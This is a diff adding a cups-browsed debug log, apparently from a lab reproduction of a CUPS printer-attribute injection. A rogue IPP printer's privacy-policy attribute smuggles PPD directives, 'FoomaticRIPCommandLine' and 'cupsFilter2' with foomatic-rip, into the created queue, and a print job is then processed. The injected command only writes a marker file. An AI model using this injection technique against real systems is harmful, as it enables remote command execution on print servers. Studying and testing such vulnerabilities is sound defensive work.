@@ -1,0 +1,304 @@
+cups-1  | Starting system message bus: dbus.
+cups-1  | Thu Oct 22 19:37:47 2026 140737439853312 Reading command line option --debug, turning on debug mode (Log on standard error).
+cups-1  | Thu Oct 22 19:37:47 2026 140737439853312 cups-browsed version 2.0.1 starting.
+cups-1  | Thu Oct 22 19:37:47 2026 140737439853312 Reading config: BrowseRemoteProtocols dnssd cups
+cups-1  | Thu Oct 22 19:37:47 2026 140737439853312 No "Browse..." line at all, accept all servers ("BrowseOrder Deny,Allow").
+cups-1  | Thu Oct 22 19:37:47 2026 140737439853312 main() in THREAD 140737439853312
+cups-1  | Thu Oct 22 19:37:47 2026 140737439853312 cups-browsed: Creating http connection to local CUPS daemon via domain socket: /run/cups/cups.sock
+cups-1  | Thu Oct 22 19:37:47 2026 140737439853312 update_netifs() in THREAD 140737439853312
+cups-1  | Thu Oct 22 19:37:47 2026 140737439853312 Network interfaces: lo (127.0.0.1, localhost), eth0 (172.18.0.2, 71472fc7a09a, 172.18.0.2*), lo (::1)
+cups-1  | Thu Oct 22 19:37:47 2026 140737439853312 cups-browsed [BrowsePoll /run/cups/cups.sock:0]: IPP-Create-Subscription
+cups-1  | Thu Oct 22 19:37:47 2026 140737439853312 cups-browsed [BrowsePoll /run/cups/cups.sock:0]: subscription ID=1
+cups-1  | Thu Oct 22 19:37:47 2026 140737439853312 cups-browsed (): cupsEnumDests
+cups-1  | Thu Oct 22 19:37:47 2026 140737439853312 Could not determine system default printer!
+cups-1  | Thu Oct 22 19:37:47 2026 140737439853312 Using signal handler SIGACTION
+cups-1  | Thu Oct 22 19:37:47 2026 140737439853312 listening
+cups-1  | Thu Oct 22 20:04:29 2026 140737439853312 Caught signal 15, shutting down ...
+cups-1  | Thu Oct 22 20:04:29 2026 140737439853312 main loop exited
+cups-1  | Thu Oct 22 20:04:29 2026 140737439853312 update_cups_queues() in THREAD 140737471985120
+cups-1  | Thu Oct 22 20:04:29 2026 140737439853312 Processing printer list ...
+cups-1  | Thu Oct 22 20:04:29 2026 140737439853312 === Remote printer overview ===
+cups-1  | Thu Oct 22 20:04:29 2026 140737439853312 ===============================
+cups-1  | Thu Oct 22 20:04:29 2026 140737439853312 === Remote printer overview ===
+cups-1  | Thu Oct 22 20:04:29 2026 140737439853312 ===============================
+cups-1  | Thu Oct 22 20:04:29 2026 140737439853312 cups-browsed [BrowsePoll /run/cups/cups.sock:0]: IPP-Cancel-Subscription
+cups-1  | Removing stale PID file /var/run/dbus/pid..
+cups-1  | Starting system message bus: dbus.
+cups-1  | Thu Oct 22 20:04:31 2026 140737439853312 Reading command line option --debug, turning on debug mode (Log on standard error).
+cups-1  | Thu Oct 22 20:04:31 2026 140737439853312 cups-browsed version 2.0.1 starting.
+cups-1  | Thu Oct 22 20:04:31 2026 140737439853312 Reading config: BrowseRemoteProtocols dnssd cups
+cups-1  | Thu Oct 22 20:04:31 2026 140737439853312 No "Browse..." line at all, accept all servers ("BrowseOrder Deny,Allow").
+cups-1  | Thu Oct 22 20:04:31 2026 140737439853312 main() in THREAD 140737439853312
+cups-1  | Thu Oct 22 20:04:31 2026 140737439853312 cups-browsed: Creating http connection to local CUPS daemon via domain socket: /run/cups/cups.sock
+cups-1  | Thu Oct 22 20:04:31 2026 140737439853312 update_netifs() in THREAD 140737439853312
+cups-1  | Thu Oct 22 20:04:31 2026 140737439853312 Network interfaces: lo (127.0.0.1, localhost), eth0 (172.18.0.2, 71472fc7a09a, 172.18.0.2*), lo (::1)
+cups-1  | Thu Oct 22 20:04:31 2026 140737439853312 cups-browsed [BrowsePoll /run/cups/cups.sock:0]: IPP-Create-Subscription
+cups-1  | Thu Oct 22 20:04:31 2026 140737439853312 cups-browsed [BrowsePoll /run/cups/cups.sock:0]: subscription ID=3
+cups-1  | Thu Oct 22 20:04:31 2026 140737439853312 cups-browsed (): cupsEnumDests
+cups-1  | Thu Oct 22 20:04:31 2026 140737439853312 Could not determine system default printer!
+cups-1  | Thu Oct 22 20:04:31 2026 140737439853312 Using signal handler SIGACTION
+cups-1  | Thu Oct 22 20:04:31 2026 140737439853312 listening
+cups-1  | Thu Oct 22 20:31:51 2026 140737439853312 process_browse_data() in THREAD 140737439853312
+cups-1  | Thu Oct 22 20:31:51 2026 140737439853312 browse packet received from 192.168.65.1
+cups-1  | Thu Oct 22 20:31:51 2026 140737439853312 incorrect browse packet format
+cups-1  | Thu Oct 22 20:41:42 2026 140737439853312 process_browse_data() in THREAD 140737439853312
+cups-1  | Thu Oct 22 20:41:42 2026 140737439853312 browse packet received from 192.168.65.1
+cups-1  | Thu Oct 22 20:41:42 2026 140737439853312 process_browse_data: location: |Office HQ|
+cups-1  | Thu Oct 22 20:41:42 2026 140737439853312 process_browse_data: info: |Printer|
+cups-1  | Thu Oct 22 20:41:42 2026 140737439853312 CUPS browsing: Remote host: host.docker.internal; Port: 8631; Remote queue name: NAME; Service Name: Printer @ host.docker.internal
+cups-1  | Thu Oct 22 20:41:42 2026 140737439853312 Found CUPS queue/class: NAME on host host.docker.internal.
+cups-1  | Thu Oct 22 20:41:42 2026 140737439853312 cups-browsed [BrowsePoll /run/cups/cups.sock:0]: IPP-Get-Notifications
+cups-1  | Thu Oct 22 20:41:42 2026 140737439853312 cups-browsed [BrowsePoll /run/cups/cups.sock:0]: no events
+cups-1  | Thu Oct 22 20:41:42 2026 140737439853312 Matching printer "Printer_host_docker_internal" with properties Host = "host.docker.internal", Port = 8631, Service Name = "Printer @ host.docker.internal", Domain = "" with the BrowseFilter lines in cups-browsed.conf
+cups-1  | Thu Oct 22 20:41:42 2026 140737439853312 All BrowseFilter lines matched or skipped, accepting printer Printer_host_docker_internal
+cups-1  | Thu Oct 22 20:41:42 2026 140737439853312 update_netifs() in THREAD 140737439853312
+cups-1  | Thu Oct 22 20:41:42 2026 140737439853312 Network interfaces: lo (127.0.0.1, localhost), eth0 (172.18.0.2, 71472fc7a09a, 172.18.0.2*), lo (::1)
+cups-1  | Thu Oct 22 20:41:42 2026 Requested IPP attributes (get-printer-attributes) for printer with URI ipp://host.docker.internal:8631/printers/NAME
+cups-1  | Thu Oct 22 20:41:42 2026 Full list of all IPP attributes:
+cups-1  | Thu Oct 22 20:41:42 2026   Attr: attributes-charset
+cups-1  | Thu Oct 22 20:41:42 2026   Value: utf-8
+cups-1  | Thu Oct 22 20:41:42 2026   Keyword: utf-8
+cups-1  | Thu Oct 22 20:41:42 2026   Attr: attributes-natural-language
+cups-1  | Thu Oct 22 20:41:42 2026   Value: en
+cups-1  | Thu Oct 22 20:41:42 2026   Keyword: en
+cups-1  | Thu Oct 22 20:41:42 2026   Attr: charset-configured
+cups-1  | Thu Oct 22 20:41:42 2026   Value: utf-8
+cups-1  | Thu Oct 22 20:41:42 2026   Keyword: utf-8
+cups-1  | Thu Oct 22 20:41:42 2026   Attr: charset-supported
+cups-1  | Thu Oct 22 20:41:42 2026   Value: utf-8
+cups-1  | Thu Oct 22 20:41:42 2026   Keyword: utf-8
+cups-1  | Thu Oct 22 20:41:42 2026   Attr: compression-supported
+cups-1  | Thu Oct 22 20:41:42 2026   Value: none
+cups-1  | Thu Oct 22 20:41:42 2026   Keyword: none
+cups-1  | Thu Oct 22 20:41:42 2026   Attr: document-format-default
+cups-1  | Thu Oct 22 20:41:42 2026   Value: application/pdf
+cups-1  | Thu Oct 22 20:41:42 2026   Keyword: application/pdf
+cups-1  | Thu Oct 22 20:41:42 2026   Attr: document-format-supported
+cups-1  | Thu Oct 22 20:41:42 2026   Value: application/pdf
+cups-1  | Thu Oct 22 20:41:42 2026   Keyword: application/pdf
+cups-1  | Thu Oct 22 20:41:42 2026   Attr: generated-natural-language-supported
+cups-1  | Thu Oct 22 20:41:42 2026   Value: en
+cups-1  | Thu Oct 22 20:41:42 2026   Keyword: en
+cups-1  | Thu Oct 22 20:41:42 2026   Attr: ipp-versions-supported
+cups-1  | Thu Oct 22 20:41:42 2026   Value: 1.1
+cups-1  | Thu Oct 22 20:41:42 2026   Keyword: 1.1
+cups-1  | Thu Oct 22 20:41:42 2026   Attr: multiple-document-jobs-supported
+cups-1  | Thu Oct 22 20:41:42 2026   Value: false
+cups-1  | Thu Oct 22 20:41:42 2026   Attr: natural-language-configured
+cups-1  | Thu Oct 22 20:41:42 2026   Value: en
+cups-1  | Thu Oct 22 20:41:42 2026   Keyword: en
+cups-1  | Thu Oct 22 20:41:42 2026   Attr: operations-supported
+cups-1  | Thu Oct 22 20:41:42 2026   Value: Print-Job,Validate-Job,Cancel-Job,Get-Job-Attributes,Get-Printer-Attributes
+cups-1  | Thu Oct 22 20:41:42 2026   Attr: pdl-override-supported
+cups-1  | Thu Oct 22 20:41:42 2026   Value: not-attempted
+cups-1  | Thu Oct 22 20:41:42 2026   Keyword: not-attempted
+cups-1  | Thu Oct 22 20:41:42 2026   Attr: printer-info
+cups-1  | Thu Oct 22 20:41:42 2026   Value: Main Printer Info
+cups-1  | Thu Oct 22 20:41:42 2026   Keyword: Main Printer Info
+cups-1  | Thu Oct 22 20:41:42 2026   Attr: printer-is-accepting-jobs
+cups-1  | Thu Oct 22 20:41:42 2026   Value: true
+cups-1  | Thu Oct 22 20:41:42 2026   Attr: printer-make-and-model
+cups-1  | Thu Oct 22 20:41:42 2026   Value: HP 0.00
+cups-1  | Thu Oct 22 20:41:42 2026   Keyword: HP 0.00
+cups-1  | Thu Oct 22 20:41:42 2026   Attr: printer-name
+cups-1  | Thu Oct 22 20:41:42 2026   Value: Main Printer
+cups-1  | Thu Oct 22 20:41:42 2026   Keyword: Main Printer
+cups-1  | Thu Oct 22 20:41:42 2026   Attr: printer-privacy-policy-uri
+cups-1  | Thu Oct 22 20:41:42 2026   Value: https://www.google.com/\"
+cups-1  | Thu Oct 22 20:41:42 2026 *FoomaticRIPCommandLine: \"echo 1 > /tmp/I_AM_VULNERABLE\"
+cups-1  | Thu Oct 22 20:41:42 2026 *cupsFilter2 : \"application/pdf application/vnd.cups-postscript 0 foomatic-rip
+cups-1  | Thu Oct 22 20:41:42 2026   Keyword: https://www.google.com/"
+cups-1  | Thu Oct 22 20:41:42 2026 *FoomaticRIPCommandLine: "echo 1 > /tmp/I_AM_VULNERABLE"
+cups-1  | Thu Oct 22 20:41:42 2026 *cupsFilter2 : "application/pdf application/vnd.cups-postscript 0 foomatic-rip
+cups-1  | Thu Oct 22 20:41:42 2026   Attr: printer-state
+cups-1  | Thu Oct 22 20:41:42 2026   Value: idle
+cups-1  | Thu Oct 22 20:41:42 2026   Attr: printer-state-reasons
+cups-1  | Thu Oct 22 20:41:42 2026   Value: none
+cups-1  | Thu Oct 22 20:41:42 2026   Keyword: none
+cups-1  | Thu Oct 22 20:41:42 2026   Attr: printer-up-time
+cups-1  | Thu Oct 22 20:41:42 2026   Value: 1792701702
+cups-1  | Thu Oct 22 20:41:42 2026   Attr: printer-uri-supported
+cups-1  | Thu Oct 22 20:41:42 2026   Value: ipp://localhost:1234/printer
+cups-1  | Thu Oct 22 20:41:42 2026   Keyword: ipp://localhost:1234/printer
+cups-1  | Thu Oct 22 20:41:42 2026   Attr: queued-job-count
+cups-1  | Thu Oct 22 20:41:42 2026   Value: 666
+cups-1  | Thu Oct 22 20:41:42 2026   Attr: uri-authentication-supported
+cups-1  | Thu Oct 22 20:41:42 2026   Value: none
+cups-1  | Thu Oct 22 20:41:42 2026   Keyword: none
+cups-1  | Thu Oct 22 20:41:42 2026   Attr: uri-security-supported
+cups-1  | Thu Oct 22 20:41:42 2026   Value: none
+cups-1  | Thu Oct 22 20:41:42 2026   Keyword: none
+cups-1  | Thu Oct 22 20:41:42 2026 Polling "media-col-database" attribute separately.
+cups-1  | Thu Oct 22 20:41:42 2026 
+cups-1  | Thu Oct 22 20:41:42 2026 140737439853312 === Remote printer overview ===
+cups-1  | Thu Oct 22 20:41:42 2026 140737439853312 ===============================
+cups-1  | Thu Oct 22 20:41:42 2026 140737439853312 === Remote printer overview ===
+cups-1  | Thu Oct 22 20:41:42 2026 140737439853312 Printer ipp://host.docker.internal:8631/printers/NAME (host.docker.internal, IP not determined): Local queue Printer_host_docker_internal, Remote CUPS Printer, Slave of None (To be created/updated)
+cups-1  | Thu Oct 22 20:41:42 2026 140737439853312 ===============================
+cups-1  | Thu Oct 22 20:41:42 2026 140737439853312 DNS-SD IDs: Service name: "Printer @ host.docker.internal", Service type: "", Domain: ""
+cups-1  | Thu Oct 22 20:41:42 2026 140737439853312 checking queues in 0s
+cups-1  | Thu Oct 22 20:41:43 2026 140737439853312 update_cups_queues() in THREAD 140737471985120
+cups-1  | Thu Oct 22 20:41:43 2026 140737439853312 Processing printer list ...
+cups-1  | Thu Oct 22 20:41:43 2026 140737439853312 === Remote printer overview ===
+cups-1  | Thu Oct 22 20:41:43 2026 140737439853312 Printer ipp://host.docker.internal:8631/printers/NAME (host.docker.internal, IP not determined): Local queue Printer_host_docker_internal, Remote CUPS Printer, Slave of None (To be created/updated)
+cups-1  | Thu Oct 22 20:41:43 2026 140737439853312 ===============================
+cups-1  | Thu Oct 22 20:41:43 2026 140737354135232 create_queue() in THREAD 140737354135232
+cups-1  | Thu Oct 22 20:41:43 2026 140737439853312 === Remote printer overview ===
+cups-1  | Thu Oct 22 20:41:43 2026 140737439853312 Printer ipp://host.docker.internal:8631/printers/NAME (host.docker.internal, IP not determined): Local queue Printer_host_docker_internal, Remote CUPS Printer, Slave of None (To be created/updated)
+cups-1  | Thu Oct 22 20:41:43 2026 140737439853312 ===============================
+cups-1  | Thu Oct 22 20:41:43 2026 140737354135232 Creating/Updating CUPS queue Printer_host_docker_internal
+cups-1  | Thu Oct 22 20:41:43 2026 140737439853312 listening
+cups-1  | Thu Oct 22 20:41:43 2026 140737354135232 Creating permanent CUPS queue Printer_host_docker_internal.
+cups-1  | Thu Oct 22 20:41:43 2026 140737354135232 Loading saved printer options for Printer_host_docker_internal from /var/cache/cups/cups-browsed-options-Printer_host_docker_internal
+cups-1  | Thu Oct 22 20:41:43 2026 140737354135232 Failed reading file /var/cache/cups/cups-browsed-options-Printer_host_docker_internal, probably no options recorded yet
+cups-1  | Thu Oct 22 20:41:43 2026 140737354135232 Print queue Printer_host_docker_internal is for remote CUPS queue(s) and we get notifications from CUPS, using implicit class device URI implicitclass://Printer_host_docker_internal/
+cups-1  | Thu Oct 22 20:41:43 2026 140737354135232 PPD generation successful: PDF PPD generated.
+cups-1  | Thu Oct 22 20:41:43 2026 140737354135232 Created temporary PPD file: /tmp/000016adb2560
+cups-1  | Thu Oct 22 20:41:43 2026 140737354135232 Using PPD /tmp/000016adb2560 for queue Printer_host_docker_internal.
+cups-1  | Thu Oct 22 20:41:43 2026 140737354135232 Editing PPD file /tmp/000016adb2560 for printer Printer_host_docker_internal, setting the option defaults of the previous cups-browsed session and doing client-side filtering of the job, saving the resulting PPD in /tmp/000016adb7bb5.
+cups-1  | Thu Oct 22 20:41:43 2026 140737354135232 Non-raw queue Printer_host_docker_internal with PPD file: /tmp/000016adb7bb5
+cups-1  | Thu Oct 22 20:41:43 2026 140737439853312 on_printer_state_changed() in THREAD 140737439853312
+cups-1  | Thu Oct 22 20:41:43 2026 140737439853312 [CUPS Notification] Printer state change on printer Printer_host_docker_internal: Now accepting jobs.
+cups-1  | Thu Oct 22 20:41:43 2026 140737439853312 [CUPS Notification] Printer state reasons: paused
+cups-1  | Thu Oct 22 20:41:43 2026 140737439853312 on_printer_state_changed() in THREAD 140737439853312
+cups-1  | Thu Oct 22 20:41:43 2026 140737439853312 [CUPS Notification] Printer state change on printer Printer_host_docker_internal: Printer "Printer_host_docker_internal" state changed to idle.
+cups-1  | Thu Oct 22 20:41:43 2026 140737439853312 [CUPS Notification] Printer state reasons: none
+cups-1  | Thu Oct 22 20:41:43 2026 140737354135232 Print queue update 1 of this series: Printer_host_docker_internal
+cups-1  | Thu Oct 22 20:41:43 2026 140737354135232 Unsetting printer-is-shared bit.
+cups-1  | Thu Oct 22 20:41:43 2026 140737354135232 Failed reading file /var/cache/cups/cups-browsed-remote-default-printer
+cups-1  | Thu Oct 22 20:41:43 2026 140737354135232 starting BrowseTimeout timer for Printer_host_docker_internal (300s)
+cups-1  | Thu Oct 22 20:45:02 2026 140737439853312 on_printer_state_changed() in THREAD 140737439853312
+cups-1  | Thu Oct 22 20:45:02 2026 140737439853312 [CUPS Notification] Printer state change on printer Printer_host_docker_internal: Printer "Printer_host_docker_internal" state changed to processing.
+cups-1  | Thu Oct 22 20:45:02 2026 140737439853312 [CUPS Notification] Printer state reasons: none
+cups-1  | Thu Oct 22 20:45:02 2026 140737439853312 on_job_state() in THREAD 140737439853312
+cups-1  | Thu Oct 22 20:45:02 2026 140737439853312 [CUPS Notification] Job state changed on printer Printer_host_docker_internal: Job #1 started.
+cups-1  | Thu Oct 22 20:45:02 2026 140737439853312 [CUPS Notification] Printer state reasons: none
+cups-1  | Thu Oct 22 20:45:02 2026 140737439853312 [CUPS Notification] Job ID: 1
+cups-1  | Thu Oct 22 20:45:02 2026 140737439853312 [CUPS Notification] Job State: job-printing
+cups-1  | Thu Oct 22 20:45:02 2026 140737439853312 [CUPS Notification] Job is processing: Yes
+cups-1  | Thu Oct 22 20:45:02 2026 140737439853312 [CUPS Notification] Printer_host_docker_internal starts processing a job.
+cups-1  | Thu Oct 22 20:45:02 2026 140737439853312 [CUPS Notification] Printer_host_docker_internal is using the "implicitclass" CUPS backend, so let us search for a destination for this job.
+cups-1  | Thu Oct 22 20:45:02 2026 140737439853312 Remote CUPS printers clustered as queue Printer_host_docker_internal:
+cups-1  | Thu Oct 22 20:45:02 2026 140737439853312   ipp://host.docker.internal:8631/printers/NAME* (last job printed)
+cups-1  | Thu Oct 22 20:45:02 2026 140737439853312 Checking state of remote printer ipp://host.docker.internal:8631/printers/NAME on host host.docker.internal, IP (null), port 8631.
+cups-1  | Thu Oct 22 20:45:02 2026 140737439853312 HTTP connection to host.docker.internal:8631 established.
+cups-1  | Thu Oct 22 20:45:02 2026 Requested IPP attributes (get-printer-attributes) for printer with URI ipp://host.docker.internal:8631/printers/NAME
+cups-1  | Thu Oct 22 20:45:02 2026 
+cups-1  | Thu Oct 22 20:45:02 2026 140737439853312 IPP request to host.docker.internal:8631 successful.
+cups-1  | Thu Oct 22 20:45:02 2026 140737439853312 IPP Response contains attributes values printer-name Main Printer, accepting-job 1
+cups-1  | Thu Oct 22 20:45:02 2026 140737439853312 Printer ipp://host.docker.internal:8631/printers/NAME on host host.docker.internal, port 8631 is accepting jobs.
+cups-1  | Thu Oct 22 20:45:02 2026 140737439853312 Printer ipp://host.docker.internal:8631/printers/NAME on host host.docker.internal, port 8631 is idle, take this as destination and stop searching.
+cups-1  | Thu Oct 22 20:45:02 2026 140737439853312 Destination for job 1 to Printer_host_docker_internal: ipp://host.docker.internal:8631/printers/NAME
+cups-1  | Thu Oct 22 20:45:02 2026 140737439853312 on_printer_modified() in THREAD 140737439853312
+cups-1  | Thu Oct 22 20:45:02 2026 140737439853312 [CUPS Notification] Printer modified: Printer "Printer_host_docker_internal" modified by "root".
+cups-1  | Thu Oct 22 20:45:02 2026 Requested IPP attributes (get-printer-attributes) for printer with URI ipp://localhost/printers/Printer_host_docker_internal
+cups-1  | Thu Oct 22 20:45:02 2026 Full list of all IPP attributes:
+cups-1  | Thu Oct 22 20:45:02 2026   Attr: attributes-charset
+cups-1  | Thu Oct 22 20:45:02 2026   Value: utf-8
+cups-1  | Thu Oct 22 20:45:02 2026   Keyword: utf-8
+cups-1  | Thu Oct 22 20:45:02 2026   Attr: attributes-natural-language
+cups-1  | Thu Oct 22 20:45:02 2026   Value: en-us
+cups-1  | Thu Oct 22 20:45:02 2026   Keyword: en-us
+cups-1  | Thu Oct 22 20:45:02 2026   Attr: printer-uri-supported
+cups-1  | Thu Oct 22 20:45:02 2026   Value: ipp://localhost/printers/Printer_host_docker_internal
+cups-1  | Thu Oct 22 20:45:02 2026   Keyword: ipp://localhost/printers/Printer_host_docker_internal
+cups-1  | Thu Oct 22 20:45:02 2026   Attr: printer-name
+cups-1  | Thu Oct 22 20:45:02 2026   Value: Printer_host_docker_internal
+cups-1  | Thu Oct 22 20:45:02 2026   Keyword: Printer_host_docker_internal
+cups-1  | Thu Oct 22 20:45:02 2026   Attr: device-uri
+cups-1  | Thu Oct 22 20:45:02 2026   Value: implicitclass://Printer_host_docker_internal/
+cups-1  | Thu Oct 22 20:45:02 2026   Keyword: implicitclass://Printer_host_docker_internal/
+cups-1  | Thu Oct 22 20:45:02 2026   Attr: printer-make-and-model
+cups-1  | Thu Oct 22 20:45:02 2026   Value: HP 0.00, driverless, 2.1b1
+cups-1  | Thu Oct 22 20:45:02 2026   Keyword: HP 0.00, driverless, 2.1b1
+cups-1  | Thu Oct 22 20:45:02 2026 
+cups-1  | Thu Oct 22 20:45:02 2026 Requested IPP attributes (get-printer-attributes) for printer with URI ipp://localhost/printers/Printer_host_docker_internal
+cups-1  | Thu Oct 22 20:45:02 2026 Full list of all IPP attributes:
+cups-1  | Thu Oct 22 20:45:02 2026   Attr: attributes-charset
+cups-1  | Thu Oct 22 20:45:02 2026   Value: utf-8
+cups-1  | Thu Oct 22 20:45:02 2026   Keyword: utf-8
+cups-1  | Thu Oct 22 20:45:02 2026   Attr: attributes-natural-language
+cups-1  | Thu Oct 22 20:45:02 2026   Value: en-us
+cups-1  | Thu Oct 22 20:45:02 2026   Keyword: en-us
+cups-1  | Thu Oct 22 20:45:02 2026   Attr: printer-uri-supported
+cups-1  | Thu Oct 22 20:45:02 2026   Value: ipp://localhost/printers/Printer_host_docker_internal
+cups-1  | Thu Oct 22 20:45:02 2026   Keyword: ipp://localhost/printers/Printer_host_docker_internal
+cups-1  | Thu Oct 22 20:45:02 2026   Attr: printer-name
+cups-1  | Thu Oct 22 20:45:02 2026   Value: Printer_host_docker_internal
+cups-1  | Thu Oct 22 20:45:02 2026   Keyword: Printer_host_docker_internal
+cups-1  | Thu Oct 22 20:45:02 2026   Attr: device-uri
+cups-1  | Thu Oct 22 20:45:02 2026   Value: implicitclass://Printer_host_docker_internal/
+cups-1  | Thu Oct 22 20:45:02 2026   Keyword: implicitclass://Printer_host_docker_internal/
+cups-1  | Thu Oct 22 20:45:02 2026   Attr: printer-make-and-model
+cups-1  | Thu Oct 22 20:45:02 2026   Value: HP 0.00, driverless, 2.1b1
+cups-1  | Thu Oct 22 20:45:02 2026   Keyword: HP 0.00, driverless, 2.1b1
+cups-1  | Thu Oct 22 20:45:02 2026 
+cups-1  | Thu Oct 22 20:45:02 2026 140737439853312 Settings of printer Printer_host_docker_internal got modified, doing backup.
+cups-1  | Thu Oct 22 20:45:02 2026 140737439853312 Recording printer options for Printer_host_docker_internal to /var/cache/cups/cups-browsed-options-Printer_host_docker_internal
+cups-1  | Thu Oct 22 20:45:02 2026 140737439853312 Recording option settings of the PPD file for Printer_host_docker_internal (HP 0.00, driverless, 2.1b1):
+cups-1  | Thu Oct 22 20:45:02 2026 140737439853312    ColorModel=RGB
+cups-1  | Thu Oct 22 20:45:02 2026 140737439853312    Duplex=None
+cups-1  | Thu Oct 22 20:45:02 2026 140737439853312    PageSize=Letter
+cups-1  | Thu Oct 22 20:45:02 2026 140737439853312 Recording option settings from the IPP attributes for Printer_host_docker_internal:
+cups-1  | Thu Oct 22 20:45:02 2026 140737439853312    printer-error-policy=stop-printer
+cups-1  | Thu Oct 22 20:45:02 2026 140737439853312    printer-is-accepting-jobs=true
+cups-1  | Thu Oct 22 20:45:02 2026 140737439853312    printer-is-shared=false
+cups-1  | Thu Oct 22 20:45:02 2026 140737439853312    printer-op-policy=default
+cups-1  | Thu Oct 22 20:45:02 2026 140737439853312    printer-state-reasons=none
+cups-1  | Thu Oct 22 20:45:02 2026 140737439853312    printer-location=Office HQ
+cups-1  | Thu Oct 22 20:45:02 2026 140737439853312    printer-geo-location=unknown
+cups-1  | Thu Oct 22 20:45:02 2026 140737439853312    printer-info=Printer
+cups-1  | Thu Oct 22 20:45:02 2026 140737439853312    job-quota-period=0
+cups-1  | Thu Oct 22 20:45:02 2026 140737439853312    job-k-limit=0
+cups-1  | Thu Oct 22 20:45:02 2026 140737439853312    job-page-limit=0
+cups-1  | Thu Oct 22 20:45:02 2026 140737439853312 on_printer_state_changed() in THREAD 140737439853312
+cups-1  | Thu Oct 22 20:45:02 2026 140737439853312 [CUPS Notification] Printer state change on printer Printer_host_docker_internal: Printer "Printer_host_docker_internal" state changed.
+cups-1  | Thu Oct 22 20:45:02 2026 140737439853312 [CUPS Notification] Printer state reasons: none
+cups-1  | Thu Oct 22 20:45:02 2026 140737439853312 on_printer_state_changed() in THREAD 140737439853312
+cups-1  | Thu Oct 22 20:45:02 2026 140737439853312 [CUPS Notification] Printer state change on printer Printer_host_docker_internal: Printer "Printer_host_docker_internal" state changed.
+cups-1  | Thu Oct 22 20:45:02 2026 140737439853312 [CUPS Notification] Printer state reasons: none
+cups-1  | Thu Oct 22 20:45:02 2026 140737439853312 on_printer_state_changed() in THREAD 140737439853312
+cups-1  | Thu Oct 22 20:45:02 2026 140737439853312 [CUPS Notification] Printer state change on printer Printer_host_docker_internal: Printer "Printer_host_docker_internal" state changed.
+cups-1  | Thu Oct 22 20:45:02 2026 140737439853312 [CUPS Notification] Printer state reasons: none
+cups-1  | Thu Oct 22 20:45:02 2026 140737439853312 on_printer_state_changed() in THREAD 140737439853312
+cups-1  | Thu Oct 22 20:45:02 2026 140737439853312 [CUPS Notification] Printer state change on printer Printer_host_docker_internal: Printer "Printer_host_docker_internal" state changed.
+cups-1  | Thu Oct 22 20:45:02 2026 140737439853312 [CUPS Notification] Printer state reasons: none
+cups-1  | Thu Oct 22 20:45:02 2026 140737439853312 on_printer_state_changed() in THREAD 140737439853312
+cups-1  | Thu Oct 22 20:45:02 2026 140737439853312 [CUPS Notification] Printer state change on printer Printer_host_docker_internal: Printer "Printer_host_docker_internal" state changed.
+cups-1  | Thu Oct 22 20:45:02 2026 140737439853312 [CUPS Notification] Printer state reasons: none
+cups-1  | Thu Oct 22 20:45:02 2026 140737439853312 on_printer_state_changed() in THREAD 140737439853312
+cups-1  | Thu Oct 22 20:45:02 2026 140737439853312 [CUPS Notification] Printer state change on printer Printer_host_docker_internal: Printer "Printer_host_docker_internal" state changed.
+cups-1  | Thu Oct 22 20:45:02 2026 140737439853312 [CUPS Notification] Printer state reasons: none
+cups-1  | Thu Oct 22 20:45:02 2026 140737439853312 on_printer_state_changed() in THREAD 140737439853312
+cups-1  | Thu Oct 22 20:45:02 2026 140737439853312 [CUPS Notification] Printer state change on printer Printer_host_docker_internal: Printer "Printer_host_docker_internal" state changed.
+cups-1  | Thu Oct 22 20:45:02 2026 140737439853312 [CUPS Notification] Printer state reasons: none
+cups-1  | Thu Oct 22 20:45:02 2026 140737439853312 on_printer_state_changed() in THREAD 140737439853312
+cups-1  | Thu Oct 22 20:45:02 2026 140737439853312 [CUPS Notification] Printer state change on printer Printer_host_docker_internal: Printer "Printer_host_docker_internal" state changed.
+cups-1  | Thu Oct 22 20:45:02 2026 140737439853312 [CUPS Notification] Printer state reasons: connecting-to-device
+cups-1  | Thu Oct 22 20:45:02 2026 140737439853312 on_printer_state_changed() in THREAD 140737439853312
+cups-1  | Thu Oct 22 20:45:02 2026 140737439853312 [CUPS Notification] Printer state change on printer Printer_host_docker_internal: Printer "Printer_host_docker_internal" state changed.
+cups-1  | Thu Oct 22 20:45:02 2026 140737439853312 [CUPS Notification] Printer state reasons: connecting-to-device
+cups-1  | Thu Oct 22 20:45:02 2026 140737439853312 on_printer_state_changed() in THREAD 140737439853312
+cups-1  | Thu Oct 22 20:45:02 2026 140737439853312 [CUPS Notification] Printer state change on printer Printer_host_docker_internal: Printer "Printer_host_docker_internal" state changed.
+cups-1  | Thu Oct 22 20:45:02 2026 140737439853312 [CUPS Notification] Printer state reasons: none
+cups-1  | Thu Oct 22 20:45:19 2026 140737439853312 on_printer_state_changed() in THREAD 140737439853312
+cups-1  | Thu Oct 22 20:45:19 2026 140737439853312 [CUPS Notification] Printer state change on printer Printer_host_docker_internal: Printer "Printer_host_docker_internal" state changed.
+cups-1  | Thu Oct 22 20:45:19 2026 140737439853312 [CUPS Notification] Printer state reasons: none
+cups-1  | Thu Oct 22 20:45:19 2026 140737439853312 on_printer_state_changed() in THREAD 140737439853312
+cups-1  | Thu Oct 22 20:45:19 2026 140737439853312 [CUPS Notification] Printer state change on printer Printer_host_docker_internal: Printer "Printer_host_docker_internal" state changed.
+cups-1  | Thu Oct 22 20:45:19 2026 140737439853312 [CUPS Notification] Printer state reasons: none
+cups-1  | Thu Oct 22 20:45:19 2026 140737439853312 on_printer_state_changed() in THREAD 140737439853312
+cups-1  | Thu Oct 22 20:45:19 2026 140737439853312 [CUPS Notification] Printer state change on printer Printer_host_docker_internal: Printer "Printer_host_docker_internal" state changed.
+cups-1  | Thu Oct 22 20:45:19 2026 140737439853312 [CUPS Notification] Printer state reasons: none
+cups-1  | Thu Oct 22 20:45:19 2026 140737439853312 on_printer_state_changed() in THREAD 140737439853312
+cups-1  | Thu Oct 22 20:45:19 2026 140737439853312 [CUPS Notification] Printer state change on printer Printer_host_docker_internal: Printer "Printer_host_docker_internal" state changed.
+cups-1  | Thu Oct 22 20:45:19 2026 140737439853312 [CUPS Notification] Printer state reasons: none
+cups-1  | Thu Oct 22 20:45:19 2026 140737439853312 on_job_state() in THREAD 140737439853312
+cups-1  | Thu Oct 22 20:45:19 2026 140737439853312 [CUPS Notification] Job state changed on printer Printer_host_docker_internal: Job stopped due to filter errors; please consult the /var/log/cups/error_log file for details.
+cups-1  | Thu Oct 22 20:45:19 2026 140737439853312 [CUPS Notification] Printer state reasons: none
